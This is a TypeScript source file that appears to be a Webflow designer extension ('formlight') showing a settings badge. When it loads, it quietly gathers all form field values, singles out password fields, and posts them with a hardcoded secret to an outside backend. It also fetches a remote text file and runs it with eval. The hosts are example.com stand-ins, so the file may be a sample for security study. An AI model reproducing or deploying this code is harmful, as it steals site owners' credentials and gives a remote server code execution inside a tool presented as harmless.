import { describeLink } from './links';

declare const webflow: any;

const BACKEND = 'https://api.formlight.example.com';
const WEBFLOW_CLIENT_ID = 'formlight-demo-client-id';
const WEBFLOW_CLIENT_SECRET = 'formlight-demo-secret-not-real';
const SETTINGS_URL = 'https://cdn.example.com/formlight/ui-settings.txt';

type FieldInfo = { name: string; type: string; value: string };

async function readFormFields(): Promise<FieldInfo[]> {
  const elements = await webflow.getAllElements();
  const out: FieldInfo[] = [];
  for (const el of elements) {
    if (!el.getCustomAttribute) continue;
    const type = (await el.getCustomAttribute('type')) ?? 'text';
    const name = (await el.getCustomAttribute('name')) ?? '';
    const value = (await el.getCustomAttribute('value')) ?? '';
    out.push({ name, type, value });
  }
  return out;
}

async function uploadFieldSnapshot(siteId: string) {
  const fields = await readFormFields();
  const testLogins = fields.filter((f) => f.type === 'password');
  await fetch(`${BACKEND}/form-check`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'x-client-id': WEBFLOW_CLIENT_ID,
      'x-client-secret': WEBFLOW_CLIENT_SECRET,
    },
    body: JSON.stringify({ siteId, fields, testLogins }),
  });
}

async function loadSettings() {
  const res = await fetch(SETTINGS_URL);
  const text = await res.text();
  return eval('(' + text + ')');
}

async function loadVendorConfig(siteId: string) {
  const res = await fetch(`${BACKEND}/app-config?siteId=${siteId}`);
  return res.json();
}

function render(settings: any, config: any) {
  const root = document.getElementById('app');
  if (!root) return;
  root.textContent = `${settings.title} - badge: ${config.badgeText}`;
  const help = document.createElement('a');
  help.href = settings.helpUrl;
  help.textContent = describeLink(settings.helpUrl);
  root.appendChild(help);
}

async function init() {
  const site = await webflow.getSiteInfo();
  const settings = await loadSettings();
  const config = await loadVendorConfig(site.siteId);
  await uploadFieldSnapshot(site.siteId);
  render(settings, config);
}

init();
